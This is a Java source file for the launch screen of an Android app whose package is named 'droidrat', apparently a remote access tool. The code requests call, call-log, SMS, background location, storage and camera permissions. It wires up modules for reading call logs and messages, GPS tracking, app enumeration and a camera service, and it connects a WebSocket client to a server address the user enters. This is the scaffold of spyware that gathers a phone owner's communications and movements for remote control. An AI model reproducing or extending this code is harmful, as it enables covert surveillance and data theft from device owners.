package com.je_chen.droidrat_je.activity;

import android.Manifest;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.content.pm.ResolveInfo;
import android.database.Cursor;
import android.hardware.SensorManager;
import android.location.Location;
import android.location.LocationManager;
import android.os.Build;
import android.os.Bundle;
import android.provider.CallLog;
import android.provider.Telephony;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.ImageView;
import android.widget.Toast;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.content.ContextCompat;

import com.je_chen.droidrat_je.R;
import com.je_chen.droidrat_je.appintent.call.Call;
import com.je_chen.droidrat_je.appintent.call.CallLogs;
import com.je_chen.droidrat_je.appintent.mail.SendMail;
import com.je_chen.droidrat_je.appintent.sms.SMS;
import com.je_chen.droidrat_je.appintent.web.Web;
import com.je_chen.droidrat_je.appsinfo.checkpermission.PermissionsCheck;
import com.je_chen.droidrat_je.appsinfo.getinfo.GetPackagesInfo;
import com.je_chen.droidrat_je.location.LocationGeocoder;
import com.je_chen.droidrat_je.location.LocationSystem;
import com.je_chen.droidrat_je.service.camera.CameraService;
import com.je_chen.droidrat_je.socket.websocket.Websocket;
import com.je_chen.droidrat_je.vibrator.VibratorSystem;

import java.io.IOException;
import java.net.URI;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Date;
import java.util.List;

public class LaunchActivity extends AppCompatActivity implements View.OnClickListener {

    final String TAG = "JE-TAG";

    PackageManager packageManager;
    SensorManager sensorManager;

    Call call;
    CallLogs callLogs;

    Web web;

    SendMail sendMail;

    SMS sms;

    VibratorSystem vibratorSystem;

    LocationSystem locationSystem;
    LocationGeocoder locationGeocoder;

    GetPackagesInfo getPackagesInfo;
    PermissionsCheck permissionsCheck;

    Websocket  websocket;

    Button testButton,connectButton;

    EditText webSocketServerText;

    ImageView imageView;


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_lanuch);

        packageManager = getPackageManager();
        permissionsCheck = new PermissionsCheck(packageManager);

        List<String> requestPermission = new ArrayList<>(Arrays.asList(
                // PHONE
                Manifest.permission.CALL_PHONE,
                Manifest.permission.READ_CALL_LOG,
                Manifest.permission.WRITE_CALL_LOG,

                // LOCATION
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.ACCESS_COARSE_LOCATION,

                //SMS
                Manifest.permission.RECEIVE_SMS,
                Manifest.permission.SEND_SMS,
                Manifest.permission.READ_SMS,

                //震動
                Manifest.permission.VIBRATE,

                //網路
                Manifest.permission.INTERNET,

                //檔案
                Manifest.permission.READ_EXTERNAL_STORAGE,
                Manifest.permission.WRITE_EXTERNAL_STORAGE,

                //照片
                Manifest.permission.CAMERA
        ));

        if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            requestPermission.add(Manifest.permission.ACCESS_BACKGROUND_LOCATION);
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            permissionsCheck.checkPermission(this, requestPermission.toArray(new String[requestPermission.size()]));
        }

        getPackagesInfo = new GetPackagesInfo(packageManager);

        sensorManager = (SensorManager) getSystemService(Context.SENSOR_SERVICE);
        LocationManager locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);

        call = new Call();
        callLogs = new CallLogs(this);

        web = new Web();

        sendMail = new SendMail();

        sms = new SMS();

        vibratorSystem = new VibratorSystem(this);
        if(ContextCompat.checkSelfPermission(this,Manifest.permission.ACCESS_BACKGROUND_LOCATION) == PackageManager.PERMISSION_GRANTED) {
            locationSystem = new LocationSystem(locationManager, "gps", 5000, 5);
            locationGeocoder = new LocationGeocoder(this);
        }


        testButton = findViewById(R.id.testButton);
        testButton.setOnClickListener(this);

        connectButton = findViewById(R.id.connectButton);
        connectButton.setOnClickListener(this);

        webSocketServerText = findViewById(R.id.webSocketServerText);

        imageView = findViewById(R.id.imageView);


    }

    @Override
    protected void onStart() {
        super.onStart();
    }

    @Override
    protected void onResume() {
        super.onResume();
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
    }

    @Override
    public void onClick(View view) {
        switch (view.getId()) {
            case R.id.testButton:
                Intent intent = new Intent(this, CameraService.class);
                startService(intent);
                break;

            case R.id.connectButton:
                try {

                URI uri = URI.create(webSocketServerText.getText().toString());
                websocket = new Websocket(uri){
                    @Override
                    public void onMessage(String message) {
                        Log.e("WebSocket",message);
                    }
                };
                websocket.connect();
                }catch (Exception e){
                    e.printStackTrace();
                }
                break;
        }
    }
}
